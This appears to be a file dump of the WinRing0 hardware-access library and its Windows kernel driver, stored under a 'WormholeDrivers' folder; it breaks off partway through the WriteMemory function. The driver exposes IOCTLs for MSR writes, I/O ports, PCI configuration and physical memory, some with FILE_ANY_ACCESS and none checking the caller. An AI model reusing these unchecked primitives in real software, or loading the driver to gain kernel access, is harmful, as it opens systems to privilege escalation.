typedef void (WINAPI *LPFN_GETNATIVESYSTEMINFO) (LPSYSTEM_INFO lpSystemInfo);

BOOL IsX64()
{
	SYSTEM_INFO systemInfo;
	BOOL isX64 = FALSE;
	LPFN_GETNATIVESYSTEMINFO fnGetNativeSystemInfo = (LPFN_GETNATIVESYSTEMINFO)GetProcAddress(
									GetModuleHandle(_T("kernel32")), "GetNativeSystemInfo");

	if(fnGetNativeSystemInfo != NULL)
	{
		fnGetNativeSystemInfo(&systemInfo);
		isX64 = (systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64);	
	}
	return isX64;
}

BOOL IsFileExist(LPCTSTR fileName)
{
    WIN32_FIND_DATA	findData;

    HANDLE hFile = FindFirstFile(fileName, &findData);
    if(hFile != INVALID_HANDLE_VALUE)
	{
		FindClose( hFile );
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

BOOL IsOnNetworkDrive(LPCTSTR fileName)
{
	TCHAR root[4];
	root[0] = fileName[0];
	root[1] = ':';
	root[2] = '\\';
	root[3] = '\0';

	if(root[0] == '\\' || GetDriveType((LPCTSTR)root) == DRIVE_REMOTE)
	{
		return TRUE;
	}

	return FALSE;
}

```

`source/WormholeDrivers/WINRING0/dll/OlsDll.h`:

```h
//-----------------------------------------------------------------------------
//     Author : hiyohiyo
//       Mail : hiyohiyo@crystalmark.info
//        Web : http://openlibsys.org/
//    License : The modified BSD license
//
//                     Copyright 2007-2009 OpenLibSys.org. All rights reserved.
//-----------------------------------------------------------------------------

#pragma once

//-----------------------------------------------------------------------------
//
// Version Information
//
//-----------------------------------------------------------------------------

#define OLS_MAJOR_VERSION				1
#define OLS_MINOR_VERSION				3
#define OLS_REVISION				    0
#define OLS_RELESE					   18

#define OLS_VERSION	((OLS_MAJOR_VERSION << 24) | (OLS_MINOR_VERSION << 16) |\
		(OLS_REVISION << 8) | OLS_RELESE) 

//-----------------------------------------------------------------------------
//
// Defines
//
//-----------------------------------------------------------------------------

#define OLS_DRIVER_FILE_NAME_WIN_9X			_T("WinRing0.vxd")
#define OLS_DRIVER_FILE_NAME_WIN_NT			_T("WinRing0.sys")
#define OLS_DRIVER_FILE_NAME_WIN_NT_X64		_T("WinRing0x64.sys")
#define OLS_DRIVER_FILE_NAME_WIN_NT_IA64	_T("WinRing0ia64.sys")  // Reserved

//-----------------------------------------------------------------------------
//
// Prototypes
//
//-----------------------------------------------------------------------------

DWORD Initialize();
void Deinitialize();
DWORD InitDriverInfo();

BOOL OpenDriver();
BOOL LoadDriver(TCHAR *DriverFileName, TCHAR *DriverId);
BOOL UnloadDriver(TCHAR *DriverId);
DWORD GetRefCount();

BOOL IsNT();
BOOL IsWow64();
```

`source/WormholeDrivers/WINRING0/dll/OlsDll.rc`:

```rc
// Microsoft Visual C++ generated resource script.
//
#include "resource.h"

#define APSTUDIO_READONLY_SYMBOLS
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 2 resource.
//
#include "afxres.h"

/////////////////////////////////////////////////////////////////////////////
#undef APSTUDIO_READONLY_SYMBOLS

/////////////////////////////////////////////////////////////////////////////
// “ú–{Śę resources

#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_JPN)
#ifdef _WIN32
LANGUAGE LANG_JAPANESE, SUBLANG_DEFAULT
#pragma code_page(932)
#endif //_WIN32

#ifdef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// TEXTINCLUDE
//

1 TEXTINCLUDE 
BEGIN
    "resource.h\0"
END

2 TEXTINCLUDE 
BEGIN
    "#include ""afxres.h""\r\n"
    "\0"
END

3 TEXTINCLUDE 
BEGIN
    "\r\n"
    "\0"
END

#endif    // APSTUDIO_INVOKED


/////////////////////////////////////////////////////////////////////////////
//
// Version
//

VS_VERSION_INFO VERSIONINFO
 FILEVERSION 1,3,0,18
 PRODUCTVERSION 1,3,0,18
 FILEFLAGSMASK 0x17L
#ifdef _DEBUG
 FILEFLAGS 0x1L
#else
 FILEFLAGS 0x0L
#endif
 FILEOS 0x4L
 FILETYPE 0x2L
 FILESUBTYPE 0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040004b0"
        BEGIN
            VALUE "Comments", "The modified BSD license"
            VALUE "CompanyName", "OpenLibSys.org"
            VALUE "FileDescription", "WinRing0"
            VALUE "FileVersion", "1.3.0.18"
            VALUE "InternalName", "WinRing0.dll"
            VALUE "LegalCopyright", "Copyright 2007-2009 OpenLibSys.org. All rights reserved."
            VALUE "OriginalFilename", "WinRing0.dll"
            VALUE "ProductName", "WinRing0"
            VALUE "ProductVersion", "1.3.0.18"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x400, 1200
    END
END

#endif    // “ú–{Śę resources
/////////////////////////////////////////////////////////////////////////////



#ifndef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 3 resource.
//


/////////////////////////////////////////////////////////////////////////////
#endif    // not APSTUDIO_INVOKED


```

`source/WormholeDrivers/WINRING0/dll/OlsIoctl.h`:

```h
//-----------------------------------------------------------------------------
//     Author : hiyohiyo
//       Mail : hiyohiyo@crystalmark.info
//        Web : http://openlibsys.org/
//    License : The modified BSD license
//
//                     Copyright 2007-2008 OpenLibSys.org. All rights reserved.
//-----------------------------------------------------------------------------

#pragma once

//-----------------------------------------------------------------------------
//
// The Device type codes form 32768 to 65535 are for customer use.
//
//-----------------------------------------------------------------------------

#define OLS_TYPE 40000

//-----------------------------------------------------------------------------
//
// Version Information
//
//-----------------------------------------------------------------------------

#define OLS_DRIVER_ID							_T("WinRing0_1_2_0")

#define OLS_DRIVER_MAJOR_VERSION				1
#define OLS_DRIVER_MINOR_VERSION				2
#define OLS_DRIVER_REVISION						0
#define OLS_DRIVER_RELESE						5

#define OLS_DRIVER_VERSION \
	((OLS_DRIVER_MAJOR_VERSION << 24) | (OLS_DRIVER_MINOR_VERSION << 16) \
	| (OLS_DRIVER_REVISION << 8) | OLS_DRIVER_RELESE) 

//-----------------------------------------------------------------------------
//
// The IOCTL function codes from 0x800 to 0xFFF are for customer use.
//
//-----------------------------------------------------------------------------
#define IOCTL_OLS_GET_DRIVER_VERSION \
	CTL_CODE(OLS_TYPE, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_OLS_GET_REFCOUNT \
	CTL_CODE(OLS_TYPE, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_OLS_READ_MSR \
	CTL_CODE(OLS_TYPE, 0x821, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_OLS_WRITE_MSR \
	CTL_CODE(OLS_TYPE, 0x822, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_OLS_READ_PMC \
	CTL_CODE(OLS_TYPE, 0x823, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_OLS_HALT \
	CTL_CODE(OLS_TYPE, 0x824, METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_OLS_READ_IO_PORT \
	CTL_CODE(OLS_TYPE, 0x831, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_OLS_WRITE_IO_PORT \
	CTL_CODE(OLS_TYPE, 0x832, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_OLS_READ_IO_PORT_BYTE \
	CTL_CODE(OLS_TYPE, 0x833, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_OLS_READ_IO_PORT_WORD \
	CTL_CODE(OLS_TYPE, 0x834, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_OLS_READ_IO_PORT_DWORD \
	CTL_CODE(OLS_TYPE, 0x835, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_OLS_WRITE_IO_PORT_BYTE \
	CTL_CODE(OLS_TYPE, 0x836, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_OLS_WRITE_IO_PORT_WORD \
	CTL_CODE(OLS_TYPE, 0x837, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_OLS_WRITE_IO_PORT_DWORD \
	CTL_CODE(OLS_TYPE, 0x838, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_OLS_READ_MEMORY \
	CTL_CODE(OLS_TYPE, 0x841, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_OLS_WRITE_MEMORY \
	CTL_CODE(OLS_TYPE, 0x842, METHOD_BUFFERED, FILE_WRITE_ACCESS)

#define IOCTL_OLS_READ_PCI_CONFIG \
	CTL_CODE(OLS_TYPE, 0x851, METHOD_BUFFERED, FILE_READ_ACCESS)

#define IOCTL_OLS_WRITE_PCI_CONFIG \
	CTL_CODE(OLS_TYPE, 0x852, METHOD_BUFFERED, FILE_WRITE_ACCESS)

//-----------------------------------------------------------------------------
//
// PCI Error Code
//
//-----------------------------------------------------------------------------

#define OLS_ERROR_PCI_BUS_NOT_EXIST		(0xE0000001L)
#define OLS_ERROR_PCI_NO_DEVICE			(0xE0000002L)
#define OLS_ERROR_PCI_WRITE_CONFIG		(0xE0000003L)
#define OLS_ERROR_PCI_READ_CONFIG		(0xE0000004L)

//-----------------------------------------------------------------------------
//
// Support Macros
//
//-----------------------------------------------------------------------------

// Bus Number, Device Number and Function Number to PCI Device Address
#define PciBusDevFunc(Bus, Dev, Func)	((Bus&0xFF)<<8) | ((Dev&0x1F)<<3) | (Func&7)
// PCI Device Address to Bus Number
#define PciGetBus(address)				((address>>8) & 0xFF)
// PCI Device Address to Device Number
#define PciGetDev(address)				((address>>3) & 0x1F)
// PCI Device Address to Function Number
#define PciGetFunc(address)				(address&7)

//-----------------------------------------------------------------------------
//
// Typedef Struct
//
//-----------------------------------------------------------------------------

#pragma pack(push,4)

typedef struct  _OLS_WRITE_MSR_INPUT {
	ULONG		Register;
	ULARGE_INTEGER	Value;
}   OLS_WRITE_MSR_INPUT;

typedef struct  _OLS_WRITE_IO_PORT_INPUT {
	ULONG	PortNumber; 
	union {
		ULONG   LongData;
		USHORT  ShortData;
		UCHAR   CharData;
	};
}   OLS_WRITE_IO_PORT_INPUT;

typedef struct  _OLS_READ_PCI_CONFIG_INPUT {
	ULONG PciAddress;
	ULONG PciOffset;
}   OLS_READ_PCI_CONFIG_INPUT;

typedef struct  _OLS_WRITE_PCI_CONFIG_INPUT {
	ULONG PciAddress;
	ULONG PciOffset;
	UCHAR Data[1];
}   OLS_WRITE_PCI_CONFIG_INPUT;

typedef LARGE_INTEGER PHYSICAL_ADDRESS;

typedef struct  _OLS_READ_MEMORY_INPUT {
	PHYSICAL_ADDRESS Address;
	ULONG UnitSize;
	ULONG Count;
}   OLS_READ_MEMORY_INPUT;

typedef struct  _OLS_WRITE_MEMORY_INPUT {
	PHYSICAL_ADDRESS Address;	 
	ULONG UnitSize;
	ULONG Count;
	UCHAR Data[1];
}   OLS_WRITE_MEMORY_INPUT;

#pragma pack(pop)

```

`source/WormholeDrivers/WINRING0/dll/resource.h`:

```h
//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by OlsDll.rc
//

// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        101
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1001
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif

```

`source/WormholeDrivers/WINRING0/dll/stdafx.cpp`:

```cpp
//-----------------------------------------------------------------------------
//     Author : hiyohiyo
//       Mail : hiyohiyo@crystalmark.info
//        Web : http://openlibsys.org/
//    License : The modified BSD license
//
//                          Copyright 2007 OpenLibSys.org. All rights reserved.
//-----------------------------------------------------------------------------

#include "stdafx.h"

```

`source/WormholeDrivers/WINRING0/dll/stdafx.h`:

```h
//-----------------------------------------------------------------------------
//     Author : hiyohiyo
//       Mail : hiyohiyo@crystalmark.info
//        Web : http://openlibsys.org/
//    License : The modified BSD license
//
//                     Copyright 2007-2008 OpenLibSys.org. All rights reserved.
//-----------------------------------------------------------------------------

#pragma once

#ifndef WINVER
#define WINVER 0x0400
#endif

#ifndef _WIN32_WINNT                
#define _WIN32_WINNT 0x0400
#endif						

#ifndef _WIN32_WINDOWS
#define _WIN32_WINDOWS 0x0410
#endif

#ifndef _WIN32_IE
#define _WIN32_IE 0x0600
#endif

#define WIN32_LEAN_AND_MEAN
#include <windows.h>

```

`source/WormholeDrivers/WINRING0/dll/sys/MAKEFILE`:

```
#
# DO NOT EDIT THIS FILE!!!  Edit .\sources. if you want to add a new source
# file to this component.  This file merely indirects to the real make file
# that is shared by all the driver components of the Windows NT DDK
#

!INCLUDE $(NTMAKEENV)\makefile.def

```

`source/WormholeDrivers/WINRING0/dll/sys/OpenLibSys.c`:

```c
//-----------------------------------------------------------------------------
//     Author : hiyohiyo
//       Mail : hiyohiyo@crystalmark.info
//        Web : http://openlibsys.org/
//    License : The modified BSD license
//
//                     Copyright 2007-2008 OpenLibSys.org. All rights reserved.
//-----------------------------------------------------------------------------

#include <ntddk.h>
#include <stddef.h>
#include "OpenLibSys.h"

//-----------------------------------------------------------------------------
//
// Global
//
//-----------------------------------------------------------------------------

static ULONG refCount;

//-----------------------------------------------------------------------------
//
// Classic NT driver
// DriverEntry / OlsDispatch / Unload
//
//-----------------------------------------------------------------------------

NTSTATUS
DriverEntry(
	IN PDRIVER_OBJECT  DriverObject,
	IN PUNICODE_STRING RegistryPath
	)

/*

Return Value:

	STATUS_SUCCESS if the driver initialized correctly, otherwise an erroror
	indicating the reason for failure.
*/

{
	NTSTATUS		status;
	UNICODE_STRING  ntDeviceName;
	UNICODE_STRING  win32DeviceName;
	PDEVICE_OBJECT  deviceObject = NULL;

	RtlInitUnicodeString(&ntDeviceName, NT_DEVICE_NAME);

	status = IoCreateDevice(
		DriverObject,					// Our Driver Object
		0,								// We don't use a device extension
		&ntDeviceName,					// Device name 
		OLS_TYPE,						// Device type
		FILE_DEVICE_SECURE_OPEN,		// Device characteristics
		FALSE,							// Not an exclusive device
		&deviceObject );				// Returned ptr to Device Object

	if(!NT_SUCCESS(status))
	{
		refCount = (ULONG)-1;
		return status;
	}
	else
	{
		refCount = 0;
	}

	// Initialize the driver object with this driver's entry points.
	DriverObject->MajorFunction[IRP_MJ_CREATE] = OlsDispatch;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = OlsDispatch;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = OlsDispatch;
	DriverObject->DriverUnload = Unload;

	// Initialize a Unicode String containing the Win32 name for our device.
	RtlInitUnicodeString(&win32DeviceName, DOS_DEVICE_NAME);

	// Create a symbolic link between our device name  and the Win32 name
	status = IoCreateSymbolicLink(&win32DeviceName, &ntDeviceName);

	if (!NT_SUCCESS(status))
	{
		// Delete everything that this routine has allocated.
		IoDeleteDevice( deviceObject );
	}

	return status;
}

NTSTATUS
OlsDispatch(
	IN	PDEVICE_OBJECT pDO,
	IN	PIRP pIrp
	)

/*++

Routine Description:
	This routine is the dispatch handler for the driver.  It is responsible
	for processing the IRPs.

Arguments:
	
	pDO - Pointer to device object.

	pIrp - Pointer to the current IRP.

Return Value:

	STATUS_SUCCESS if the IRP was processed successfully, otherwise an erroror
	indicating the reason for failure.

--*/

{
	PIO_STACK_LOCATION pIrpStack;
	NTSTATUS status;
	int index;

	//  Initialize the irp info field.
	//	  This is used to return the number of bytes transfered.
	pIrp->IoStatus.Information = 0;
	pIrpStack = IoGetCurrentIrpStackLocation(pIrp);

	//  Set default return status
	status = STATUS_NOT_IMPLEMENTED;

	// Dispatch based on major fcn code.
	switch(pIrpStack->MajorFunction)
	{
		case IRP_MJ_CREATE:
			if(refCount != (ULONG)-1){refCount++;}
			status = STATUS_SUCCESS;
			break;
		case IRP_MJ_CLOSE:
			if(refCount != (ULONG)-1){refCount--;}
			status = STATUS_SUCCESS;
			break;

		case IRP_MJ_DEVICE_CONTROL:
			//  Dispatch on IOCTL
			switch(pIrpStack->Parameters.DeviceIoControl.IoControlCode)
			{
			case IOCTL_OLS_GET_DRIVER_VERSION:
				*(PULONG)pIrp->AssociatedIrp.SystemBuffer = OLS_DRIVER_VERSION;
				pIrp->IoStatus.Information = 4;
				status = STATUS_SUCCESS;
				break;

			case IOCTL_OLS_GET_REFCOUNT:
				*(PULONG)pIrp->AssociatedIrp.SystemBuffer = refCount;
				pIrp->IoStatus.Information = sizeof(refCount);
				status = STATUS_SUCCESS;
				break;

			case IOCTL_OLS_READ_MSR:
				status = ReadMsr(
					pIrp->AssociatedIrp.SystemBuffer,
					pIrpStack->Parameters.DeviceIoControl.InputBufferLength,
					pIrp->AssociatedIrp.SystemBuffer,
					pIrpStack->Parameters.DeviceIoControl.OutputBufferLength,
					(ULONG*)&pIrp->IoStatus.Information
					);
				break;
			case IOCTL_OLS_WRITE_MSR:
				status = WriteMsr(
					pIrp->AssociatedIrp.SystemBuffer,
					pIrpStack->Parameters.DeviceIoControl.InputBufferLength,
					pIrp->AssociatedIrp.SystemBuffer,
					pIrpStack->Parameters.DeviceIoControl.OutputBufferLength,
					(ULONG*)&pIrp->IoStatus.Information
					);
				break;
			case IOCTL_OLS_READ_PMC:
				status = ReadPmc(
					pIrp->AssociatedIrp.SystemBuffer,
					pIrpStack->Parameters.DeviceIoControl.InputBufferLength,
					pIrp->AssociatedIrp.SystemBuffer,
					pIrpStack->Parameters.DeviceIoControl.OutputBufferLength,
					(ULONG*)&pIrp->IoStatus.Information
					);
				break;
			case IOCTL_OLS_HALT:
				__halt();
				status = STATUS_SUCCESS;
				break;

			case IOCTL_OLS_READ_IO_PORT:
			case IOCTL_OLS_READ_IO_PORT_BYTE:
			case IOCTL_OLS_READ_IO_PORT_WORD:
			case IOCTL_OLS_READ_IO_PORT_DWORD:
				status = ReadIoPort(
					pIrpStack->Parameters.DeviceIoControl.IoControlCode,
					pIrp->AssociatedIrp.SystemBuffer,
					pIrpStack->Parameters.DeviceIoControl.InputBufferLength,
					pIrp->AssociatedIrp.SystemBuffer,
					pIrpStack->Parameters.DeviceIoControl.OutputBufferLength,
					(ULONG*)&pIrp->IoStatus.Information
					);
				break;
			case IOCTL_OLS_WRITE_IO_PORT:
			case IOCTL_OLS_WRITE_IO_PORT_BYTE:
			case IOCTL_OLS_WRITE_IO_PORT_WORD:
			case IOCTL_OLS_WRITE_IO_PORT_DWORD:
				status = WriteIoPort(
					pIrpStack->Parameters.DeviceIoControl.IoControlCode,
					pIrp->AssociatedIrp.SystemBuffer,
					pIrpStack->Parameters.DeviceIoControl.InputBufferLength,
					pIrp->AssociatedIrp.SystemBuffer,
					pIrpStack->Parameters.DeviceIoControl.OutputBufferLength,
					(ULONG*)&pIrp->IoStatus.Information
					);
				break;

			case IOCTL_OLS_READ_PCI_CONFIG:
				status = ReadPciConfig(
					pIrp->AssociatedIrp.SystemBuffer,
					pIrpStack->Parameters.DeviceIoControl.InputBufferLength,
					pIrp->AssociatedIrp.SystemBuffer,
					pIrpStack->Parameters.DeviceIoControl.OutputBufferLength,
					(ULONG*)&pIrp->IoStatus.Information
					);
				break;
			case IOCTL_OLS_WRITE_PCI_CONFIG:
				status = WritePciConfig(
					pIrp->AssociatedIrp.SystemBuffer,
					pIrpStack->Parameters.DeviceIoControl.InputBufferLength,
					pIrp->AssociatedIrp.SystemBuffer,
					pIrpStack->Parameters.DeviceIoControl.OutputBufferLength,
					(ULONG*)&pIrp->IoStatus.Information
					);
				break;

			case IOCTL_OLS_READ_MEMORY:
				status = ReadMemory(
					pIrp->AssociatedIrp.SystemBuffer,
					pIrpStack->Parameters.DeviceIoControl.InputBufferLength,
					pIrp->AssociatedIrp.SystemBuffer,
					pIrpStack->Parameters.DeviceIoControl.OutputBufferLength,
					(ULONG*)&pIrp->IoStatus.Information
					);
				break;
			case IOCTL_OLS_WRITE_MEMORY:
				status = WriteMemory(
					pIrp->AssociatedIrp.SystemBuffer,
					pIrpStack->Parameters.DeviceIoControl.InputBufferLength,
					pIrp->AssociatedIrp.SystemBuffer,
					pIrpStack->Parameters.DeviceIoControl.OutputBufferLength,
					(ULONG*)&pIrp->IoStatus.Information
					);
				break;


			}
			break;
	}

	// We're done with I/O request.  Record the status of the I/O action.
	pIrp->IoStatus.Status = status;

	// Don't boost priority when returning since this took little time.
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);

	return status;
}

VOID
Unload(
	PDRIVER_OBJECT DriverObject
	)
/*++

Routine Description:

	This routine is called by the I/O system to unload the driver.

	Any resources previously allocated must be freed.

Arguments:

	DriverObject - a pointer to the object that represents our driver.

Return Value:

	None
--*/

{
	PDEVICE_OBJECT deviceObject = DriverObject->DeviceObject;
	UNICODE_STRING win32NameString;

	PAGED_CODE();

	// Create counted string version of our Win32 device name.
	RtlInitUnicodeString(&win32NameString, DOS_DEVICE_NAME);

	// Delete the link from our device name to a name in the Win32 namespace.
	IoDeleteSymbolicLink(&win32NameString);

	if(deviceObject != NULL)
	{
		IoDeleteDevice(deviceObject);
	}
}

//-----------------------------------------------------------------------------
//
// CPU
//
//-----------------------------------------------------------------------------

NTSTATUS
ReadMsr(	void	*lpInBuffer, 
			ULONG	nInBufferSize, 
			void	*lpOutBuffer, 
			ULONG	nOutBufferSize, 
			ULONG	*lpBytesReturned)
{
	__try
	{
		ULONGLONG data = __readmsr(*(ULONG*)lpInBuffer);
		memcpy((PULONG)lpOutBuffer, &data, 8);
		*lpBytesReturned = 8;
		return STATUS_SUCCESS;
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		*lpBytesReturned = 0;
		return STATUS_UNSUCCESSFUL;
	}
}

NTSTATUS
WriteMsr(	void	*lpInBuffer, 
			ULONG	nInBufferSize, 
			void	*lpOutBuffer, 
			ULONG	nOutBufferSize, 
			ULONG	*lpBytesReturned)
{
	__try
	{
		OLS_WRITE_MSR_INPUT* param;
		param = (OLS_WRITE_MSR_INPUT*)lpInBuffer;

		__writemsr(param->Register, param->Value.QuadPart);
		*lpBytesReturned = 0;
		return STATUS_SUCCESS;
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		*lpBytesReturned = 0;
		return STATUS_UNSUCCESSFUL;
	}
}

NTSTATUS
ReadPmc(	void	*lpInBuffer, 
			ULONG	nInBufferSize, 
			void	*lpOutBuffer, 
			ULONG	nOutBufferSize, 
			ULONG	*lpBytesReturned)
{
	__try
	{
		ULONGLONG data = __readpmc(*(ULONG*)lpInBuffer);
		memcpy((PULONG)lpOutBuffer, &data, 8);
		*lpBytesReturned = 8;
		return STATUS_SUCCESS;
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		*lpBytesReturned = 0;
		return STATUS_UNSUCCESSFUL;
	}
}

//-----------------------------------------------------------------------------
//
// IO Port
//
//-----------------------------------------------------------------------------

NTSTATUS
ReadIoPort( ULONG	ioControlCode,
			void	*lpInBuffer, 
			ULONG	nInBufferSize, 
			void	*lpOutBuffer, 
			ULONG	nOutBufferSize, 
			ULONG	*lpBytesReturned)
{
	ULONG nPort = *(ULONG*)lpInBuffer;

	switch(ioControlCode)
	{
		case IOCTL_OLS_READ_IO_PORT_BYTE:
			*(PUCHAR)lpOutBuffer = READ_PORT_UCHAR((PUCHAR)(ULONG_PTR)nPort);
			break;
		case IOCTL_OLS_READ_IO_PORT_WORD:
			*(PUSHORT)lpOutBuffer = READ_PORT_USHORT((PUSHORT)(ULONG_PTR)nPort);
			break;
		case IOCTL_OLS_READ_IO_PORT_DWORD:
			*(PULONG)lpOutBuffer = READ_PORT_ULONG((PULONG)(ULONG_PTR)nPort);
			break;
		default:
			*lpBytesReturned = 0;
			return STATUS_INVALID_PARAMETER;
			break;
	}
	
	*lpBytesReturned = nInBufferSize;
	return STATUS_SUCCESS;
}

NTSTATUS
WriteIoPort(ULONG	ioControlCode,
			void	*lpInBuffer, 
			ULONG	nInBufferSize, 
			void	*lpOutBuffer, 
			ULONG	nOutBufferSize, 
			ULONG	*lpBytesReturned)
{
	ULONG nPort;
	OLS_WRITE_IO_PORT_INPUT* param;
	
	param = (OLS_WRITE_IO_PORT_INPUT*)lpInBuffer;
	nPort = param->PortNumber;

	switch(ioControlCode)
	{

		case IOCTL_OLS_WRITE_IO_PORT_BYTE:
			WRITE_PORT_UCHAR((PUCHAR)(ULONG_PTR)nPort, param->CharData);
			break;
		case IOCTL_OLS_WRITE_IO_PORT_WORD:
			WRITE_PORT_USHORT((PUSHORT)(ULONG_PTR)nPort, param->ShortData);
			break;
		case IOCTL_OLS_WRITE_IO_PORT_DWORD:
			WRITE_PORT_ULONG((PULONG)(ULONG_PTR)nPort, param->LongData);
			break;
		default:
			return STATUS_INVALID_PARAMETER;
			break;
	}

	return STATUS_SUCCESS;
}

//-----------------------------------------------------------------------------
//
// PCI
//
//-----------------------------------------------------------------------------

NTSTATUS
ReadPciConfig(	void	*lpInBuffer, 
				ULONG	nInBufferSize, 
				void	*lpOutBuffer, 
				ULONG	nOutBufferSize, 
				ULONG	*lpBytesReturned)
{
	OLS_READ_PCI_CONFIG_INPUT *param;
	NTSTATUS status;

	if(nInBufferSize != sizeof(OLS_READ_PCI_CONFIG_INPUT))
	{
		return STATUS_INVALID_PARAMETER;
	}
	param = (OLS_READ_PCI_CONFIG_INPUT *)lpInBuffer;

	status = pciConfigRead(param->PciAddress, param->PciOffset,
						lpOutBuffer, nOutBufferSize);

	if(status == STATUS_SUCCESS)
	{
		*lpBytesReturned = nOutBufferSize;
	}
	else
	{
		*lpBytesReturned = 0;
	}

	return status;
}

NTSTATUS
WritePciConfig(	void *lpInBuffer, 
				ULONG nInBufferSize, 
				void *lpOutBuffer, 
				ULONG nOutBufferSize, 
				ULONG *lpBytesReturned)

{
	OLS_WRITE_PCI_CONFIG_INPUT *param;
	ULONG writeSize;
	NTSTATUS status;

	if(nInBufferSize < offsetof(OLS_WRITE_PCI_CONFIG_INPUT, Data))
	{
		return STATUS_INVALID_PARAMETER;
	}

	param = (OLS_WRITE_PCI_CONFIG_INPUT *)lpInBuffer;
	writeSize = nInBufferSize - offsetof(OLS_WRITE_PCI_CONFIG_INPUT, Data);
	
	*lpBytesReturned = 0;

	return pciConfigWrite(param->PciAddress, param->PciOffset,
							&param->Data, writeSize);

}

//-----------------------------------------------------------------------------
//
// Support Function
//
//-----------------------------------------------------------------------------

NTSTATUS pciConfigRead(ULONG pciAddress, ULONG offset, void *data, int length)
{
	PCI_SLOT_NUMBER slot;
	int error;
	ULONG busNumber;

	busNumber = PciGetBus(pciAddress);
	slot.u.AsULONG = 0;
	slot.u.bits.DeviceNumber = PciGetDev(pciAddress);
	slot.u.bits.FunctionNumber = PciGetFunc(pciAddress);
	error =	HalGetBusDataByOffset(PCIConfiguration, busNumber, slot.u.AsULONG,
									data, offset, length);

	if(error == 0)
	{
		return OLS_ERROR_PCI_BUS_NOT_EXIST;
	}
	else if(length != 2 && error == 2)
	{
		return OLS_ERROR_PCI_NO_DEVICE;
	}
	else if(length != error)
	{
		return OLS_ERROR_PCI_READ_CONFIG;
	}

	return STATUS_SUCCESS;
}

NTSTATUS pciConfigWrite(ULONG pciAddress, ULONG offset, void *data, int length)
{
	PCI_SLOT_NUMBER slot;
	int error;
	ULONG busNumber;

	busNumber = PciGetBus(pciAddress);

	slot.u.AsULONG = 0;
	slot.u.bits.DeviceNumber = PciGetDev(pciAddress);
	slot.u.bits.FunctionNumber = PciGetFunc(pciAddress);
	error = HalSetBusDataByOffset(PCIConfiguration, busNumber, slot.u.AsULONG,
									data, offset, length);

	if(error != length)
	{
		return OLS_ERROR_PCI_WRITE_CONFIG;
	}

	return STATUS_SUCCESS;
}


//-----------------------------------------------------------------------------
//
// Physical Memory
//
//-----------------------------------------------------------------------------

NTSTATUS
ReadMemory(	void	*lpInBuffer, 
			ULONG	nInBufferSize, 
			void	*lpOutBuffer, 
			ULONG	nOutBufferSize, 
			ULONG	*lpBytesReturned)
{
	OLS_READ_MEMORY_INPUT *param;
	ULONG	size;
	PHYSICAL_ADDRESS address;
	PVOID	maped;
	BOOLEAN	error;

	if(nInBufferSize != sizeof(OLS_READ_MEMORY_INPUT))
	{
		return STATUS_INVALID_PARAMETER;
	}

	param = (OLS_READ_MEMORY_INPUT *)lpInBuffer;
	size = param->UnitSize * param->Count;

	if(nOutBufferSize < size)
	{
		return STATUS_INVALID_PARAMETER;
	}

	address.QuadPart = param->Address.QuadPart;

#ifndef _PHYSICAL_MEMORY_SUPPORT

	if(0x000C0000 > address.QuadPart 
	|| (address.QuadPart + size - 1) > 0x000FFFFF)
	{
		return STATUS_INVALID_PARAMETER;
	}

#endif

	maped = MmMapIoSpace(address, size, FALSE);

	error = FALSE;
	switch(param->UnitSize){
		case 1:
			READ_REGISTER_BUFFER_UCHAR(maped, lpOutBuffer, param->Count);
			break;
		case 2:
			READ_REGISTER_BUFFER_USHORT(maped, lpOutBuffer, param->Count);
			break;
		case 4:
			READ_REGISTER_BUFFER_ULONG(maped, lpOutBuffer, param->Count);
			break;
		default:
			error = TRUE;
			break;
	}

	MmUnmapIoSpace(maped, size);

	if(error)
	{
		return STATUS_INVALID_PARAMETER;
	}

	*lpBytesReturned = nOutBufferSize;

	return STATUS_SUCCESS;
}

NTSTATUS
WriteMemory(void	*lpInBuffer, 
			ULONG	nInBufferSize, 
			void	*lpOutBuffer, 
			ULONG	nOutBufferSize, 
			ULONG	*lpBytesReturned)
{
#ifdef _PHYSICAL_MEMORY_SUPPORT

	OLS_WRITE_MEMORY_INPUT *param;
	ULONG size;
	PHYSICAL_ADDRESS address;
	PVOID	maped;
	BOOLEAN	error;

